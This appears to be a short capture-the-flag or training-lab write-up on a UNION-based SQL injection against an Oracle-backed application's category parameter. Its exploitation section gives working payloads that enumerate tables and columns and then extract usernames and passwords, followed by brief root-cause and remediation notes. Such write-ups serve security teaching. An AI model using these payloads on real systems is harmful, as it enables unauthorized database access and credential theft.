# Mystery Lab

## Goal
 - Find and exploit SQLi.

## Enumeration
 - The application is vulnerable to a UNION-based SQL injection in the category parameter.
 - The backend database is Oracle.

## Testting
 - The query returns two columns.
 - Both columns accept string values.
 - The application displays the query results, making UNION-based extraction possible.

## Exploitation
 First of all I need to know tables which db contains
 ```
  ' UNION SELECT table_name,'fd' FROM all_tables-- 
 ```
 ALL_TABLES is an Oracle system view that contains information about accessible tables. I found *USERS_BCAFWN* table.

 Let's find out which columns it has.
 ```
  ' UNION SELECT column_name,'fd' FROM all_tab_columns WHERE table_name='USERS_BCAFWN'--
 ```
 There are *USERNAME_JUXEHY* and *PASSWORD_MXVXCF* columns

 final payload:
 ```
  ' UNION SELECT USERNAME_JUXEHY,PASSWORD_MXVXCF FROM USERS_BCAFWN-- 
 ```

## Root cause
 - The application constructs SQL queries using unsanitized user input.

## Remediation 
 - Avoid dynamic SQL query construction.
 - Validate input where appropriate.